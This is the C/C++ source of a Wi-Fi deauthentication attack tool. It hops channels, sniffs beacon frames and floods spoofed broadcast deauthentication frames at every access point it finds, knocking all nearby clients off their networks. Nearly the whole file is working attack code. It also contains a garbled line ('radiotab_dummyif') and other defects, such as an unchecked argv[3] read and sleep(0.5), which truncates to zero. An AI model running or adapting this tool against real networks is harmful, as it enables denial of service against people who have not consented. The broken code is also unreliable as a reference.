#include <netinet/in.h>
#include <pcap.h>
#include <string.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <unistd.h>
#include <pthread.h>

#include <iostream>

//#include <iwlib.h>
#include "iwlib.h"
#include "deauth-attack.h"

void usage() {
	printf("syntax : deauth-attack <interface> <ap mac> [<station mac>] [-auth]\n");
	printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

void DumpHex(const void* data, int size) {
  char ascii[17];
  int i, j;
  ascii[16] = '\0';
  for (i = 0; i < size; ++i) {
    printf("%02X ", ((unsigned char*)data)[i]);
    if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
      ascii[i % 16] = ((unsigned char*)data)[i];
    } else {
      ascii[i % 16] = '.';
    }
    if ((i+1) % 8 == 0 || i+1 == size) {
      printf(" ");
      if ((i+1) % 16 == 0) {
        printf("|  %s \n", ascii);
      } else if (i+1 == size) {
        ascii[(i+1) % 16] = '\0';
        if ((i+1) % 16 <= 8) {
          printf(" ");
        }
        for (j = (i+1) % 16; j < 16; ++j) {
          printf("   ");
        }
        printf("|  %s \n", ascii);
      }
    }
  }
}

bool parse(Param* param, int argc, char* argv[]) {
	if (argc < 3) {
		usage();
		return false;
	}
	param->dev_ = argv[1];
	param->ap_mac_ = argv[2];
	param->station_mac_ = argv[3];
	if(argc == 5)
		param->auth_ = true;
	return true;
}

void* channel_hop(void* dev){
	int skfd = iw_sockets_open();
        iwrange range;

        if (iw_get_range_info(skfd, (const char*)dev, &range) < 0) {
        	printf("Error during iw_get_range_info.\n");
        	exit(2);
        }

        double freq[range.num_frequency] = {0, };
        char buffer[128];
        for(int k = 0; k < range.num_frequency; k++)
        {
              freq[k] = iw_freq2float(&(range.freq[k]));
              iw_print_freq_value(buffer, sizeof(buffer), freq[k]);
              printf("          Channel %.2d : %s\n",
                     range.freq[k].i, buffer);
        }

        struct iwreq wrq;

	wrq.u.freq.flags = IW_FREQ_FIXED;

	int now = 0;

	while(true){
		now = (now + 1) % range.num_frequency;
		printf("hehe");
		iw_float2freq(freq[now], &(wrq.u.freq));

		if(iw_set_ext(skfd, (const char*)dev, SIOCSIWFREQ, &wrq) < 0)
    			break;
		sleep(1);
	}
}

int main(int argc, char* argv[]) {
	if (!parse(&param, argc, argv))
		return -1;

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
		return -1;
	}

	pthread_t thrChannelHop;
	int iChannelHop;
	iChannelHop = pthread_create(&thrChannelHop, NULL, channel_hop, param.dev_);

	while (true) {
		struct pcap_pkthdr* header;
                const u_char* get_packet;
                int res = pcap_next_ex(pcap, &header, &get_packet);
                if (res == 0) continue;
                radiotab_dummyif (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                        printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
                        break;
                }
		struct ieee80211_radiotap_hdr radiotab;

		memcpy(&radiotab, get_packet, sizeof(ieee80211_radiotap_hdr));	
		
		u_char* packet = NULL;
		//struct ieee80211_radiotap_hdr radiotab;
		//struct ieee80211_deauth_hdr deauth;

		memcpy(&radiotab, get_packet, sizeof(radiotab));
		if(*(get_packet+radiotab.it_len) != 0x80)	continue;

		struct ieee80211_radiotap_hdr radiotab_fk;
		struct ieee80211_deauth_hdr deauth;
		u_char radiotab_dummy[] = {0x00, 0x00, 0x0b, 0x00, 0x00, 0x80, 0x02, 0x00, 0x00, 0x00, 0x00};
		memcpy(&radiotab_fk, radiotab_dummy, 11);

		deauth.version = 0;
		deauth.frame_type = 0;
		deauth.frame_subtype = 12;
		deauth.flag = 0;
		deauth.duration = 0;
		
		u_char ap_mac[6] = {0, };
		u_char station_mac[6];

		/*sscanf(param.ap_mac_, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
				&ap_mac[0], 
				&ap_mac[1], 
				&ap_mac[2], 
				&ap_mac[3], 
				&ap_mac[4], 
				&ap_mac[5]);*/
		//DumpHex(get_packet, header->caplen);
		memcpy(ap_mac,(get_packet+radiotab.it_len+0xa), IEEE802_11_MAC_LENGTH);
		memset(&deauth.addr1, 0xff, IEEE802_11_MAC_LENGTH);
                memcpy(&deauth.addr2, ap_mac, IEEE802_11_MAC_LENGTH);
		memcpy(&deauth.addr3, ap_mac, IEEE802_11_MAC_LENGTH);
		
		deauth.numbers = 0;
		deauth.fix.reason_code = 0x700;
		packet = (u_char*)malloc(sizeof(radiotab_fk)+sizeof(deauth));

		memcpy(packet, &radiotab_fk, sizeof(radiotab_fk));
		memcpy(packet+sizeof(radiotab_fk), &deauth, sizeof(deauth));

		if(pcap_sendpacket(pcap, packet, sizeof(radiotab_fk)+sizeof(deauth)) != 0){
			fprintf(stderr, "pcap_sendpacket(%s) error\n", param.dev_);
		}
		
		free(packet);
		printf("send packet\n");
		sleep(0.5);
	}
		
	
	pcap_close(pcap);
}
